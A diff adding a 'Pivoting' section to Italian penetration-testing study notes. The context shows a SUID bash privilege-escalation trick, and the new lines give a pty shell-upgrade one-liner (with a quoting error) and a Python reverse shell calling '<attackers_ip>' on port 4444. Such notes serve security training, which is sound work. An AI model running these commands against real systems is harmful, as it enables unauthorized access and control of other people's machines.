@@ -118,4 +118,19 @@ Sfrutta con:
 `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/utente/script.sh`
 `/tmp/bash -p`
 # Pivoting
-25
+Passaggio da una macchina all'altra, cosa molto comune durante una grande valutazione, potrai utilizzare tutte le tecniche che abbiamo studiato ma dovrai passare da un'altra macchina.
+Verranno mostrati:
+- Abbellimento della shell
+- Tunneling
+- Port Knocking
+## Abbellimento della shell
+Di certo non puoi eseguire exploits su una web shell $\texttt{di merda}$.
+`python3 -c import pty; pty.spawn("/bin/bash)`
+Versione reverse:
+```
+python3 -c 'import socket,subprocess,os;\
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\
+s.connect(("<attackers_ip>",4444));os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);\
+os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
